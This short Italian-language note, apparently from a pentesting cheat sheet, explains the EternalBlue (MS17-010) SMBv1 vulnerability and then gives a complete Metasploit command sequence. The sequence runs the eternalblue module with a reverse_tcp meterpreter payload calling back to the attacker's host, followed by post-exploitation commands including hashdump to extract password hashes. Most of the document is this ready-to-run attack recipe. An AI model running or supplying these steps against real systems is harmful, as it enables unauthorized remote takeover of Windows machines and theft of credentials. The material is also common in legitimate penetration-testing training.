# Exploit EternalBlue (MS17-010)

**EternalBlue** è una vulnerabilità critica identificata come **MS17-010** che colpisce il protocollo **SMBv1** su sistemi Windows non aggiornati (XP, 2003, 7). <br>
Questa vulnerabilità consente l'esecuzione di codice da remoto (**RCE**) senza autenticazione, sfruttando un bug nei pacchetti SMB. <br>
È diventata celebre in quanto utilizzata dal worm **WannaCry**. <br>
EternalBlue è sfruttabile solo se il servizio SMBv1 è attivo e non patchato.

Metasploit:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set SMBPIPE BROWSER
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <KaliIP>
set LPORT <Port>
run
```

Una volta ottenuta la shell:
- `getuid`, `getprivs`, `hashdump`
